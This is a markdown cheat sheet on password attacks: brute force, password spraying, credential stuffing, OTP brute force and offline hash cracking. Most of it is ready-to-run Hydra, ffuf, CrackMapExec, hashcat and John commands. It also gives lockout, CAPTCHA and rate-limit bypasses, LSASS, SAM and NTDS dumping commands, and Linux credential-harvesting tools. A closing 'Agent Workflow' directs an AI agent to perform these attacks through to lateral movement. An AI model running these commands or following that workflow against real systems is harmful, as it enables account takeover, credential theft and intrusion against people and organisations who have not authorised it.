# Password Attacks

> **Summary**: Techniques for discovering, guessing, spraying, stuffing, and cracking credentials across online services, web applications, and offline hash databases.
> **Impact**: Unauthorized access to accounts, lateral movement, privilege escalation, data breach.
> **Typical Severity**: High | Critical

## Attack Types Overview

| Type | Description | Target |
|---|---|---|
| **Brute Force** | Systematically try all possible combinations | Single account, strong lockout bypass needed |
| **Dictionary Attack** | Try passwords from a wordlist | Single or multiple accounts |
| **Password Spraying** | Try a few common passwords against many accounts | Multiple accounts, avoids lockout |
| **Credential Stuffing** | Reuse leaked username:password pairs from breaches | Accounts with password reuse |
| **Rule-Based Attack** | Apply mutation rules to a wordlist (append numbers, leet speak, etc.) | Offline cracking or targeted guessing |
| **Offline Cracking** | Crack password hashes extracted from databases or files | Dumped hashes (post-exploitation) |

---

## Detection

### Indicators
- Login forms without rate limiting or account lockout
- Applications returning different error messages for valid vs invalid usernames (user enumeration)
- APIs that do not enforce throttling on authentication endpoints
- Predictable OTP/2FA codes (short numeric codes without rate limiting)

### Automated Detection
- Nuclei templates for default credentials and login brute force
- Burp Intruder with cluster bomb / sniper attacks on login forms
- Custom scripts checking for rate limiting behavior

### Manual Detection
1. Submit 5-10 rapid login attempts with wrong passwords -- observe lockout behavior
2. Check error messages: "Invalid username" vs "Invalid password" reveals user enumeration
3. Test for CAPTCHA enforcement after failed attempts
4. Verify if rate limiting applies per IP, per session, or per account
5. Check for default credentials on admin panels and services

---

## Exploitation

### Prerequisites
- Identified login endpoint (web form, API, SSH, FTP, SMB, etc.)
- Username list or known usernames
- Password wordlist or custom dictionary

### Step-by-Step

#### 1. Web Login Form Brute Force
1. Identify the login endpoint, HTTP method, and parameters (Burp intercept)
2. Determine success/failure indicators (status code, response body, redirect)
3. Check for anti-brute-force protections (CAPTCHA, rate limit, CSRF token)
4. Configure the brute force tool with appropriate wordlists
5. Launch the attack and filter for successful responses
6. **Success**: valid credentials found, indicated by different response size/code/redirect

#### 2. Password Spraying
1. Gather a list of valid usernames (from user enumeration, OSINT, email harvesting)
2. Select 3-5 common passwords (e.g., `Spring2024!`, `Password1`, `Welcome1`, `<CompanyName>123`)
3. Try each password against all usernames with delay between rounds to avoid lockout
4. Respect lockout thresholds (typically 3-5 attempts per account per 30 minutes)
5. **Success**: valid credential pair discovered

#### 3. Credential Stuffing
1. Obtain leaked credential lists from breach databases
2. Filter for the target domain/service
3. Automate login attempts using the exact username:password pairs
4. **Success**: accounts with reused passwords are compromised

#### 4. OTP / 2FA Brute Force
1. Identify OTP length and format (4-digit, 6-digit numeric)
2. Check if rate limiting is enforced on the OTP verification endpoint
3. If no rate limiting: brute force all combinations (10,000 for 4-digit, 1,000,000 for 6-digit)
4. Use multiple IP addresses or session tokens if per-IP rate limiting exists
5. **Success**: valid OTP submitted, 2FA bypassed

### Payloads

#### Online Brute Force Tools

**Hydra -- Web Login Form:**
```bash
# POST form brute force
hydra -L <USERS_FILE> -P <PASSWORDS_FILE> <TARGET> http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials" -t 16

# HTTPS variant
hydra -L <USERS_FILE> -P <PASSWORDS_FILE> <TARGET> https-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP Basic Auth
hydra -L <USERS_FILE> -P <PASSWORDS_FILE> <TARGET> http-get /admin/

# Single user, password list
hydra -l admin -P <PASSWORDS_FILE> <TARGET> http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
```

**Hydra -- Service Brute Force:**
```bash
hydra -L <USERS_FILE> -P <PASSWORDS_FILE> <SERVICE>://<IP>
hydra -l <USER> -P <PASSWORDS_FILE> ssh://<IP>
hydra -l <USER> -P <PASSWORDS_FILE> ftp://<IP>
hydra -l <USER> -P <PASSWORDS_FILE> rdp://<IP>
hydra -C <USER_PASS_COMBO_FILE> ssh://<IP>   # Credential stuffing format
```

**ffuf -- Web Login:**
```bash
# POST login brute force
ffuf -u https://<TARGET>/login -X POST -d "username=admin&password=FUZZ" -w <PASSWORDS_FILE> -fc 401

# Header-based auth
ffuf -u https://<TARGET>/api/admin -w <PASSWORDS_FILE> -H "Authorization: Bearer FUZZ" -fc 401,403
```

**Burp Intruder:**
- Sniper: single parameter, iterate through wordlist
- Battering Ram: same payload in all positions simultaneously
- Pitchfork: parallel iteration through multiple wordlists (credential stuffing)
- Cluster Bomb: all combinations of multiple wordlists (username x password)

**CrackMapExec / NetExec:**
```bash
# SMB password spraying
crackmapexec smb <IP> -u <USERS_FILE> -p <PASSWORDS_FILE>

# WinRM brute force
crackmapexec winrm <IP> -u <USERS_FILE> -p <PASSWORDS_FILE>

# Enumerate SMB shares with discovered creds
crackmapexec smb <IP> -u <USER> -p <PASSWORD> --shares

# Dump SAM hashes
crackmapexec smb <IP> --local-auth -u <USER> -p <PASSWORD> --sam

# Dump LSA secrets
crackmapexec smb <IP> --local-auth -u <USER> -p <PASSWORD> --lsa

# Dump NTDS.dit
crackmapexec smb <IP> -u <USER> -p <PASSWORD> --ntds
```

#### Default Credentials Databases

| Resource | URL |
|---|---|
| DefaultCreds Cheat Sheet | https://github.com/ihebski/DefaultCreds-cheat-sheet |
| SecLists Default Passwords | https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials |
| CIRT.net Passwords | https://www.cirt.net/passwords |
| Many Passwords | https://many-passwords.github.io/ |
| Phenoelit DPL | http://www.phenoelit.org/dpl/dpl.html |

#### Offline Hash Cracking

**Hashcat:**
```bash
# Common hash modes
hashcat -m 0    <HASHES_FILE> <WORDLIST>   # MD5
hashcat -m 100  <HASHES_FILE> <WORDLIST>   # SHA1
hashcat -m 1400 <HASHES_FILE> <WORDLIST>   # SHA256
hashcat -m 1800 <HASHES_FILE> <WORDLIST>   # sha512crypt ($6$)
hashcat -m 3200 <HASHES_FILE> <WORDLIST>   # bcrypt
hashcat -m 1000 <HASHES_FILE> <WORDLIST>   # NTLM
hashcat -m 5600 <HASHES_FILE> <WORDLIST>   # NetNTLMv2
hashcat -m 13100 <HASHES_FILE> <WORDLIST>  # Kerberoast (TGS-REP)
hashcat -m 18200 <HASHES_FILE> <WORDLIST>  # AS-REP roast
hashcat -m 16500 <HASHES_FILE> <WORDLIST>  # JWT (HMAC-SHA256)
hashcat -m 22100 <HASHES_FILE> <WORDLIST>  # BitLocker

# Rule-based attack
hashcat -m 1000 <HASHES_FILE> <WORDLIST> -r /usr/share/hashcat/rules/best64.rule

# Mask attack (brute force pattern)
hashcat -m 1000 <HASHES_FILE> -a 3 ?u?l?l?l?l?l?d?d   # Uppercase + 5 lower + 2 digits
```

**John the Ripper:**
```bash
# Auto-detect hash type
john <HASHES_FILE> --wordlist=<WORDLIST>

# Specific format
john <HASHES_FILE> --wordlist=<WORDLIST> --format=Raw-SHA256

# Show cracked passwords
john <HASHES_FILE> --show

# Conversion tools
ssh2john.py <SSH_KEY> > ssh.hash
zip2john <ZIP_FILE> > zip.hash
pdf2john.pl <PDF_FILE> > pdf.hash
office2john.py <DOCX_FILE> > office.hash
bitlocker2john -i <VHD_FILE> > bitlocker.hash
```

#### Wordlist Generation

**CeWL (Custom Word List):**
```bash
cewl https://<TARGET> -d 4 -m 6 --lowercase -w custom_wordlist.txt
```

**CUPP (Common User Passwords Profiler):**
```bash
python3 cupp.py -i    # Interactive mode: generate wordlist from target info (names, dates, pets)
```

**Crunch:**
```bash
crunch <MIN_LEN> <MAX_LEN> <CHARSET> -o wordlist.txt
crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt
crunch 6 8 -t ,@@^^%%   # Pattern: uppercase, 2 lower, 2 special, 2 digits
```

**Username Generation:**
```bash
# username-anarchy: generate username variations from names
./username-anarchy -i <NAMES_FILE>
# Produces: jsmith, j.smith, john.smith, smithj, etc.
```

**Hashcat Rules for Password Mutation:**
```bash
hashcat --force <PASSWORDS_FILE> -r <RULES_FILE> --stdout > mutated_wordlist.txt
# Popular rule files: best64.rule, rockyou-30000.rule, dive.rule
```

#### Common Wordlists

| Wordlist | Path / URL |
|---|---|
| rockyou.txt | `/usr/share/wordlists/rockyou.txt` |
| SecLists | https://github.com/danielmiessler/SecLists |
| Kaonashi | https://github.com/kaonashi-passwords/Kaonashi |
| CrackStation | https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm |
| Weakpass | https://weakpass.com/wordlist/ |
| Assetnote Wordlists | https://wordlists.assetnote.io/ |

### Proof of Concept

**Password spraying with ffuf (avoiding lockout):**
```bash
# Spray one password at a time across all users, with delay
for pass in 'Spring2024!' 'Password1' 'Welcome1'; do
  ffuf -u https://<TARGET>/api/login -X POST \
    -d "{\"username\":\"FUZZ\",\"password\":\"${pass}\"}" \
    -H "Content-Type: application/json" \
    -w <USERS_FILE> -fc 401 -rate 10
  sleep 1800  # Wait 30 minutes between sprays
done
```

---

## Bypasses

- **Rate limit bypass**: rotate source IPs, use `X-Forwarded-For` header manipulation, change User-Agent per request -- see [Rate Limit Bypass](../../web/exploitation/vulns/rate-limit-bypass.md)
- **CAPTCHA bypass**: check if CAPTCHA is validated server-side; try removing the CAPTCHA parameter; use OCR tools (tesseract) for simple CAPTCHAs
- **Account lockout bypass**: password spray (few passwords against many accounts); reset lockout counter with valid login between sprays
- **CSRF token handling**: extract CSRF tokens dynamically using Burp macros or session handling rules
- **IP-based lockout**: use cloud functions (AWS Lambda, GCP Cloud Functions) to rotate egress IPs
- **WAF bypass**: slow down request rate, randomize request parameters, use HTTP/2 multiplexing

---

## Escalation

- **Lateral movement**: use discovered credentials against other services (SSH, RDP, VPN, internal apps)
- **Hash extraction**: with admin access, dump SAM/NTDS/shadow files for offline cracking
- **Pass-the-Hash**: use NTLM hashes directly without cracking (via Evil-WinRM, CrackMapExec)
- **Kerberoasting**: request TGS tickets for service accounts and crack them offline
- **AS-REP Roasting**: target accounts with Kerberos pre-authentication disabled
- **Token forgery**: cracked JWT secrets allow forging arbitrary tokens

---

## Windows Local Password Extraction

```bash
# LSASS dump
Get-Process lsass
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <LSASS_PID> C:\lsass.dmp full
pypykatz lsa minidump /path/to/lsass.dmp

# Registry hive extraction
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\security C:\security.save
reg.exe save hklm\system C:\system.save
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# NTDS.dit via Volume Shadow Copy
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

## Linux Local Password Extraction

```bash
# Unshadow and crack
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes <WORDLIST>

# Search for credentials in files
grep -rnw "password" /home/ /var/ /etc/ /opt/ 2>/dev/null
grep -rnw "PRIVATE KEY" /home/ 2>/dev/null | grep ":1"
tail -n5 /home/*/.bash*

# Credential extraction tools
python3 mimipenguin.py
python2.7 lazagne.py all
python3 lazagne.py browsers

# Firefox saved passwords
ls -l .mozilla/firefox/ | grep default
python3 firefox_decrypt.py
```

---

## Tools

| Tool | Usage |
|---|---|
| [Hydra](https://github.com/vanhauser-thc/thc-hydra) | Online brute force for SSH, FTP, HTTP, RDP, SMB, and 50+ protocols |
| [Burp Intruder](https://portswigger.net/burp) | Web login brute force with CSRF/session token handling |
| [ffuf](https://github.com/ffuf/ffuf) | Fast web fuzzer for login endpoints and API keys |
| [CrackMapExec / NetExec](https://github.com/Pennyw0rth/NetExec) | SMB/WinRM/LDAP password spraying and hash dumping |
| [Hashcat](https://hashcat.net/hashcat/) | GPU-accelerated offline hash cracking |
| [John the Ripper](https://www.openwall.com/john/) | CPU-based hash cracking with format auto-detection |
| [CeWL](https://github.com/digininja/CeWL) | Custom wordlist generation from target websites |
| [CUPP](https://github.com/Mebus/cupp) | Profiling-based password list generator |
| [username-anarchy](https://github.com/urbanadventurer/username-anarchy) | Username permutation generator from names |
| [Patator](https://github.com/lanjelot/patator) | Multi-purpose brute force with modular design |
| [Medusa](http://foofus.net/goons/jmk/medusa/medusa.html) | Parallel network login brute forcer |
| [Legba](https://github.com/evilsocket/legba) | Modern multi-protocol credential tester |
| [Sprayhound](https://github.com/Hackndo/sprayhound) | AD password spraying with lockout awareness |

---

## Related

- [2FA Bypass](../../web/exploitation/authentication/2fa.md) -- brute forcing OTP codes
- [Rate Limit Bypass](../../web/exploitation/vulns/rate-limit-bypass.md) -- bypassing rate limits to enable brute force
- [Registration Vulnerabilities](../../web/exploitation/authentication/registration-vulns.md) -- user enumeration via registration

---

## Agent Workflow
> Step-by-step instructions for an AI agent to perform password attacks across online and offline targets.

### Phase 1: Assessment
1. Identify the target authentication mechanism:
   - Web login form (POST parameters, CSRF tokens, success/failure indicators)
   - Service authentication (SSH, FTP, RDP, SMB, WinRM)
   - API authentication (token-based, Basic Auth, Bearer)
2. Enumerate valid usernames:
   - Web: registration errors, password reset, REST API, author IDs
   - Services: SMTP VRFY, finger, LDAP enumeration, RID cycling
3. Assess anti-brute-force protections:
   - Account lockout policy and threshold
   - Rate limiting (per IP, per session, per account)
   - CAPTCHA presence and enforcement
   - Response timing differences
4. Select appropriate attack strategy based on protections

### Phase 2: Online Attacks
1. **No rate limiting**: full dictionary attack
   ```
   hydra -L <USERS> -P <PASSWORDS> <TARGET> <SERVICE>
   ```
2. **Rate limiting per IP**: password spraying with delays
   ```
   # Spray one password at a time, wait between rounds
   crackmapexec smb <TARGET> -u <USERS> -p 'Password1' --continue-on-success
   # Wait for lockout reset period, then spray next password
   ```
3. **Service brute force**:
   ```
   hydra -l <USER> -P <WORDLIST> ssh://<TARGET>
   hydra -l <USER> -P <WORDLIST> ftp://<TARGET>
   hydra -L <USERS> -P <PASSWORDS> <TARGET> http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
   ```
4. **Credential stuffing**: use leaked credential pairs
   ```
   hydra -C <COMBO_FILE> ssh://<TARGET>
   ```
5. **Default credentials**: test known defaults for identified services
   ```
   # Check default creds databases before brute forcing
   ```

### Phase 3: Offline Cracking
1. Identify hash type:
   ```
   haiti <HASH_VALUE>
   ```
2. Run Hashcat with appropriate mode and wordlist:
   ```
   hashcat -m <MODE> <HASHES_FILE> <WORDLIST> -r /usr/share/hashcat/rules/best64.rule
   ```
3. Generate custom wordlists if standard lists fail:
   ```
   cewl https://<TARGET> -d 4 -m 6 --lowercase -w custom.txt
   python3 cupp.py -i   # Profile-based generation
   ```
4. Try mask attacks for common patterns:
   ```
   hashcat -m <MODE> <HASHES_FILE> -a 3 ?u?l?l?l?l?l?d?d
   ```

### Phase 4: Next Steps
- Use discovered credentials for lateral movement (test against other services)
- If admin credentials: pursue further exploitation (RCE, data access)
- Extract additional hashes from compromised systems (SAM, NTDS, shadow)
- Perform pass-the-hash attacks with NTLM hashes (no cracking needed)
- Feed credentials to [pivoting](../../infra/helpers/pivoting.md) for network lateral movement

## Decision Tree

```
START: Authentication target identified
  |
  +--> Enumerate valid usernames
  |
  +--> Assess protections (lockout, rate limit, CAPTCHA)
  |      |
  |      +--> No protections? --> Full dictionary attack
  |      +--> Account lockout? --> Password spraying (2-3 passwords per round)
  |      +--> Rate limit per IP? --> Rotate IPs or slow spray
  |      +--> CAPTCHA? --> Check if server-side; try bypass
  |
  +--> Select attack type:
  |      |
  |      +--> Web form? --> Hydra/ffuf with correct parameters
  |      +--> Network service? --> Hydra/CrackMapExec
  |      +--> Leaked creds available? --> Credential stuffing
  |      +--> Default creds possible? --> Test known defaults first
  |
  +--> Credentials obtained?
  |      |
  |      +--> Yes --> Validate, test reuse, escalate
  |      +--> No --> Generate custom wordlist (CeWL, CUPP), retry
  |
  +--> Offline hashes available?
         |
         +--> Yes --> Identify type --> Hashcat with rules
         +--> No --> Focus on online attacks
```

## Success Criteria

- [ ] Target authentication mechanism identified
- [ ] Valid usernames enumerated
- [ ] Anti-brute-force protections assessed
- [ ] Appropriate attack strategy selected
- [ ] Online attack executed (dictionary, spray, or stuffing)
- [ ] Default credentials tested
- [ ] Offline hashes cracked (if available)
- [ ] Discovered credentials validated and reuse tested
- [ ] Findings documented with attack chain

## References

- [HackTricks - Brute Force CheatSheet](https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force)
- [SecLists Repository](https://github.com/danielmiessler/SecLists)
- [DefaultCreds Cheat Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
- [Hashcat Wiki - Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [PayloadsAllTheThings - Password Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings)
